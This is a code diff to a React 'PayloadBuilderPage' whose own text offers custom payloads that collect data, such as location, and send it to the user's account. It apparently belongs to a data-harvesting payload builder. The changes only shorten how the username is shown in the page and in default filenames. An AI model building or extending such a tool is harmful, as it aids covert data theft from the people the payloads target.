@@ -49,6 +49,13 @@ function PayloadBuilderPage() {
         }
     }, []);
 
+    // Helper to display truncated key for privacy (first 8 chars + ...)
+    const getDisplayKey = (key) => {
+        if (!key) return 'unknown';
+        if (key.length <= 10) return key;
+        return key.substring(0, 8) + '...';
+    };
+
     const features = [
         {
             key: 'location',
@@ -141,8 +148,9 @@ function PayloadBuilderPage() {
                 throw new Error('Not authenticated');
             }
 
-            // Generate filename - use custom name or default
-            const finalOutputName = outputName.trim() || `payload_${userInfo?.username || 'unknown'}_${Date.now()}`;
+            // Generate filename - use custom name or default (use short key for filename)
+            const shortKey = userInfo?.username ? userInfo.username.substring(0, 8) : 'unknown';
+            const finalOutputName = outputName.trim() || `payload_${shortKey}_${Date.now()}`;
 
             const response = await fetch('/api/payloads/generate', {
                 method: 'POST',
@@ -206,7 +214,7 @@ function PayloadBuilderPage() {
             <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                 Create custom payloads that will collect data and send it to your account.
                 {userInfo?.username && (
-                    <span> Logs will be attributed to: <strong>{userInfo.username}</strong></span>
+                    <span> Logs will be attributed to: <strong>{getDisplayKey(userInfo.username)}</strong></span>
                 )}
             </Typography>
 
@@ -293,7 +301,7 @@ function PayloadBuilderPage() {
                         </Typography>
                         {userInfo?.username && (
                             <Typography variant="body2" color="text.secondary">
-                                Target Account: <strong>{userInfo.username}</strong>
+                                Target Account: <strong>{getDisplayKey(userInfo.username)}</strong>
                             </Typography>
                         )}
                     </Box>
@@ -301,7 +309,7 @@ function PayloadBuilderPage() {
                     <Box sx={{ display: 'flex', flexDirection: 'column', gap: 2, alignItems: 'flex-end' }}>
                         <TextField
                             label="Output Filename"
-                            placeholder={`payload_${userInfo?.username || 'unknown'}_${Date.now()}`}
+                            placeholder={`payload_${userInfo?.username ? userInfo.username.substring(0, 8) : 'unknown'}_${Date.now()}`}
                             value={outputName}
                             onChange={(e) => setOutputName(e.target.value)}
                             size="small"
